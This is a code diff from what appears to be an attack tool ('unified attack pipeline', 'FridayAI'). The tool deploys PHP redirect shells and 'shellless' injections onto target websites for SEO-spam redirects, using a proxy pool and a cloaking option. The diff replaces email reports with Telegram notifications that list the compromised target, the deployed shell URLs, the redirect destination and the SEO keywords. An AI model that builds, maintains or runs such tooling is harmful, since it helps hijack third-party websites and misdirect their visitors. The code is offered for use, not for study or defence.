@@ -15,7 +15,7 @@ import { eq, desc, and } from "drizzle-orm";
 import { runUnifiedAttackPipeline, type PipelineConfig, type PipelineEvent, type PipelineResult } from "./unified-attack-pipeline";
 // Legacy engine removed — unified pipeline only (no infinite loop fallback)
 import { AIAutonomousBrain } from "./ai-autonomous-brain";
-import { notifyOwner } from "./_core/notification";
+import { sendTelegramNotification } from "./telegram-notifier";
 import { proxyPool } from "./proxy-pool";
 
 // ═══════════════════════════════════════════════
@@ -332,11 +332,20 @@ async function runPipelineInBackground(
         data: { verifiedUrls: pipelineResult.verifiedFiles.map(f => f.url) },
       });
 
-      // Notify owner
+      // Notify via Telegram (primary notification channel)
       try {
-        await notifyOwner({
-          title: `✅ Deploy สำเร็จ: ${params.targetDomain}`,
-          content: `Job #${deployId} เสร็จแล้ว — ${pipelineResult.verifiedFiles.length} files verified, redirect working\nURLs: ${pipelineResult.verifiedFiles.map(f => f.url).join(", ")}`,
+        await sendTelegramNotification({
+          type: "success",
+          targetUrl: params.targetDomain,
+          redirectUrl: params.redirectUrl,
+          deployedUrls: pipelineResult.verifiedFiles.map(f => f.url),
+          shellType: "redirect_php",
+          duration: Date.now() - startTime,
+          errors: [],
+          keywords: Array.isArray(params.seoKeywords) ? params.seoKeywords : (params.seoKeywords ? [params.seoKeywords] : []),
+          cloakingEnabled: false,
+          injectedFiles: 0,
+          details: `${pipelineResult.verifiedFiles.length} files verified, redirect working`,
         });
       } catch { /* notification is best-effort */ }
 
@@ -383,30 +392,29 @@ async function runPipelineInBackground(
       } : undefined,
     });
 
-    // Notify owner (detailed email report)
+    // Notify via Telegram (primary notification channel)
     try {
-      const shelllessDetail = shelllessSuccesses.length > 0
-        ? `\n\nShellless Successes:\n${shelllessSuccesses.map(r => `- ${r.method}: ${r.detail}${r.injectedUrl ? ` → ${r.injectedUrl}` : ""}`).join("\n")}`
-        : "";
-      const verifiedDetail = pipelineResult && pipelineResult.verifiedFiles.length > 0
-        ? `\n\nVerified URLs:\n${pipelineResult.verifiedFiles.map(f => `- ${f.url}`).join("\n")}`
-        : "";
-      const errorDetail = pipelineResult && pipelineResult.errors.length > 0
-        ? `\n\nErrors (top 5):\n${pipelineResult.errors.slice(0, 5).map(e => `- ${e}`).join("\n")}`
-        : "";
+      const realDeployedUrls = pipelineResult?.uploadedFiles
+        .filter(f => !f.method.startsWith("shellless_") || f.redirectWorks)
+        .map(f => f.url)
+        .filter(url => url !== params.targetDomain) || [];
+      const shelllessRedirects = pipelineResult?.uploadedFiles
+        .filter(f => f.method.startsWith("shellless_") && f.redirectWorks)
+        .map(f => `${f.url} (via ${f.method.replace("shellless_", "")})`) || [];
+      const deployedUrls = realDeployedUrls.length > 0 ? realDeployedUrls : shelllessRedirects;
 
-      await notifyOwner({
-        title: `${hasVerified ? "✅" : shelllessSuccesses.length > 0 ? "⚠️" : partial ? "⚠️" : "❌"} FridayAI Report: ${params.targetDomain}`,
-        content: [
-          `Job #${deployId} — ${statusText}`,
-          `Duration: ${Math.round(duration / 1000)}s`,
-          `Target: ${params.targetDomain}`,
-          `Redirect: ${params.redirectUrl}`,
-          pipelineResult ? `Shells: ${pipelineResult.shellsGenerated}, Uploads: ${pipelineResult.uploadAttempts}, Deployed: ${pipelineResult.uploadedFiles.length}, Verified: ${pipelineResult.verifiedFiles.length}` : "",
-          shelllessDetail,
-          verifiedDetail,
-          errorDetail,
-        ].filter(Boolean).join("\n"),
+      await sendTelegramNotification({
+        type: hasVerified ? "success" : (hasShelllessRedirect ? "partial" : (partial ? "partial" : "failure")),
+        targetUrl: params.targetDomain,
+        redirectUrl: params.redirectUrl,
+        deployedUrls,
+        shellType: "redirect_php",
+        duration,
+        errors: pipelineResult?.errors.slice(0, 5) || [],
+        keywords: Array.isArray(params.seoKeywords) ? params.seoKeywords : (params.seoKeywords ? [params.seoKeywords] : []),
+        cloakingEnabled: false,
+        injectedFiles: 0,
+        details: statusText,
       });
     } catch { /* best-effort */ }
 
@@ -420,11 +428,20 @@ async function runPipelineInBackground(
       progress: 0,
     });
 
-    // Notify on failure
+    // Notify failure via Telegram
     try {
-      await notifyOwner({
-        title: `❌ Deploy ล้มเหลว: ${params.targetDomain}`,
-        content: `Job #${deployId} error: ${e.message}`,
+      await sendTelegramNotification({
+        type: "failure",
+        targetUrl: params.targetDomain,
+        redirectUrl: params.redirectUrl,
+        deployedUrls: [],
+        shellType: "unknown",
+        duration,
+        errors: [e.message],
+        keywords: Array.isArray(params.seoKeywords) ? params.seoKeywords : (params.seoKeywords ? [params.seoKeywords] : []),
+        cloakingEnabled: false,
+        injectedFiles: 0,
+        details: `Job #${deployId} error: ${e.message}`,
       });
     } catch { /* best-effort */ }
   } finally {
